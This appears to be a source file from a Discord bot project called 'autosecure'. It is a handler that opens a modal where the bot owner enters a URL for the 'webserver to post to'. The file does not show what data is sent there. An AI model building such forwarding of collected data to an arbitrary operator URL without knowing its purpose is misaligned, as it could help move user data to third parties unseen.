const { TextInputStyle } = require("discord.js");
const generate = require("../../../autosecure/utils/generate");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");
const { queryParams } = require("../../../db/database");

module.exports = {
    name: "postserver",
    editautosecure: true,
    callback: async (client, interaction) => {
        let [t, botnumber, ownerid] = interaction.customId.split("|");
        let actionId = generate(32);
        await queryParams(
            `INSERT INTO actions (id, action) VALUES (?, ?)`,
            [actionId, `changepostservermodal|${botnumber}|${ownerid}`]
        );
        let customModalId = `action|${actionId}`




        interaction.showModal(modalBuilder(
            customModalId,
            `Change webserver to post to`,
            [
                {
                    setCustomId: 'postserver',
                    setRequired: false,
                    setLabel: 'Enter URL',
                    setPlaceholder: 'e.g. ur api',
                    setStyle: TextInputStyle.Short
                }
            ]
        ));
    }
};
